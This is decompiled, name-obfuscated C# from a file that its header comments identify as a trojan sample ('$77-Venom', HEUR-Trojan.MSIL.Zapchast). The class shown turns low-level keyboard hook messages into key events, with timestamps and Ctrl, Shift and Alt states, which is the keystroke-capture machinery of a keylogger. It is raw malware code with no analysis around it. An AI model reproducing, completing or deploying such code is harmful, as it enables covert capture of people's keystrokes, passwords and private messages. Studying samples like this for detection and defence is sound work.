// Decompiled with JetBrains decompiler
// Type: 难唷潤劇Ⴏ唣ṯ⍼Ⴎ작ᇬﱕ柡ﲕ�卲㳞嵵�
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class 难唷潤劇Ⴏ唣ṯ\u237CႮ작ᇬﱕ柡ﲕ\uFFFD卲㳞嵵\uFFFD\uE0E9 : KeyEventArgs
{
  public 难唷潤劇Ⴏ唣ṯ\u237CႮ작ᇬﱕ柡ﲕ\uFFFD卲㳞嵵\uFFFD\uE0E9(Keys keyData)
    : base(keyData)
  {
  }

  internal 难唷潤劇Ⴏ唣ṯ\u237CႮ작ᇬﱕ柡ﲕ\uFFFD卲㳞嵵\uFFFD\uE0E9(
    Keys keyData,
    int timestamp,
    bool isKeyDown,
    bool isKeyUp)
    : this(keyData)
  {
    this.Timestamp = timestamp;
    this.IsKeyDown = isKeyDown;
    this.IsKeyUp = isKeyUp;
  }

  public int Timestamp { get; private set; }

  public bool IsKeyDown { get; private set; }

  public bool IsKeyUp { get; private set; }

  internal static 难唷潤劇Ⴏ唣ṯ\u237CႮ작ᇬﱕ柡ﲕ\uFFFD卲㳞嵵\uFFFD\uE0E9 \uEE5D\uE8FA띠앫㿙癯\uF368ᑪ\uFFFD轱輲纯㽌ō罒睇鎠媗\u18AB\uF802(
    ᠸ3귦觤娼闙\uEB3F揂숿涜頭᥏뼶榦듘㾇긟랈欐멒 data)
  {
    IntPtr wparam = data.WParam;
    IntPtr lparam = data.LParam;
    int tickCount = Environment.TickCount;
    int int64 = (int) (uint) lparam.ToInt64();
    bool flag1 = (int64 & 1073741824) != 0;
    bool flag2 = (int64 & int.MinValue) != 0;
    int keyData = (int) 难唷潤劇Ⴏ唣ṯ\u237CႮ작ᇬﱕ柡ﲕ\uFFFD卲㳞嵵\uFFFD\uE0E9.\u0859ꢄ忛䓞偵끝쀏坉ﾹ\u0DE2搱冞톊틼릿ꔜ톺\uF748之叏((Keys) (int) wparam);
    bool flag3 = !flag1 && !flag2;
    bool flag4 = flag1 & flag2;
    int timestamp = tickCount;
    int num1 = flag3 ? 1 : 0;
    int num2 = flag4 ? 1 : 0;
    return new 难唷潤劇Ⴏ唣ṯ\u237CႮ작ᇬﱕ柡ﲕ\uFFFD卲㳞嵵\uFFFD\uE0E9((Keys) keyData, timestamp, num1 != 0, num2 != 0);
  }

  internal static 难唷潤劇Ⴏ唣ṯ\u237CႮ작ᇬﱕ柡ﲕ\uFFFD卲㳞嵵\uFFFD\uE0E9 \u26C8疘ꖕ跆쬌ﶦ쩙ްꧢᗉ蘣\u3337\uE524䆤遡\u2232㤦떍\u2AC3\u19F7(
    ᠸ3귦觤娼闙\uEB3F揂숿涜頭᥏뼶榦듘㾇긟랈欐멒 data)
  {
    IntPtr wparam = data.WParam;
    ꞩ\uAACC覚좲밬鴤齇넠躨쥤錮\uF870筬澎楧༷윯\uE3F1\uF79D\u196E structure = (ꞩ\uAACC覚좲밬鴤齇넠躨쥤錮\uF870筬澎楧༷윯\uE3F1\uF79D\u196E) Marshal.PtrToStructure(data.LParam, typeof (ꞩ\uAACC覚좲밬鴤齇넠躨쥤錮\uF870筬澎楧༷윯\uE3F1\uF79D\u196E));
    Keys keyData = 难唷潤劇Ⴏ唣ṯ\u237CႮ작ᇬﱕ柡ﲕ\uFFFD卲㳞嵵\uFFFD\uE0E9.\u0859ꢄ忛䓞偵끝쀏坉ﾹ\u0DE2搱冞톊틼릿ꔜ톺\uF748之叏((Keys) structure.慀뛈\uFFFDھὗ᳸鶿ᦩᢶ囱댏䄢\uE4A3䒿輋\uE817\uE900蓱銞ꗠ);
    int num = (int) wparam;
    bool isKeyDown = num == 256 || num == 260;
    bool isKeyUp = num == 257 || num == 261;
    return new 难唷潤劇Ⴏ唣ṯ\u237CႮ작ᇬﱕ柡ﲕ\uFFFD卲㳞嵵\uFFFD\uE0E9(keyData, structure.윴脶秾䃗\u0FC0鞾ꢘሊ䤁\uF1E2\uF386ዜ\uF17A\uF1D4ꩽ髤艇䅑\u26F8뇛, isKeyDown, isKeyUp);
  }

  private static bool 皜\uFE41穼\uE9A3蟥璃켂谧\uF15Fꦼ\uEF5A坻논ꪬ懿ﺶ\u1AE6뵁觮㿏(int vKey) => ((int) \u09CD챽韱馕ꯠ\uF828렰惢뭷澪厈麸呟㥶亢䦵輅킟豞牂.顎즲锺亣羘쪨徤醬틧썱\u2673쐢把지뽖繷뵧\uF13F兑靆(vKey) & 32768) > 0;

  private static Keys \u0859ꢄ忛䓞偵끝쀏坉ﾹ\u0DE2搱冞톊틼릿ꔜ톺\uF748之叏(Keys keyData)
  {
    bool flag1 = 难唷潤劇Ⴏ唣ṯ\u237CႮ작ᇬﱕ柡ﲕ\uFFFD卲㳞嵵\uFFFD\uE0E9.皜\uFE41穼\uE9A3蟥璃켂谧\uF15Fꦼ\uEF5A坻논ꪬ懿ﺶ\u1AE6뵁觮㿏(17);
    bool flag2 = 难唷潤劇Ⴏ唣ṯ\u237CႮ작ᇬﱕ柡ﲕ\uFFFD卲㳞嵵\uFFFD\uE0E9.皜\uFE41穼\uE9A3蟥璃켂谧\uF15Fꦼ\uEF5A坻논ꪬ懿ﺶ\u1AE6뵁觮㿏(16);
    bool flag3 = 难唷潤劇Ⴏ唣ṯ\u237CႮ작ᇬﱕ柡ﲕ\uFFFD卲㳞嵵\uFFFD\uE0E9.皜\uFE41穼\uE9A3蟥璃켂谧\uF15Fꦼ\uEF5A坻논ꪬ懿ﺶ\u1AE6뵁觮㿏(18);
    return keyData | (flag1 ? Keys.Control : Keys.None) | (flag2 ? Keys.Shift : Keys.None) | (flag3 ? Keys.Alt : Keys.None);
  }
}
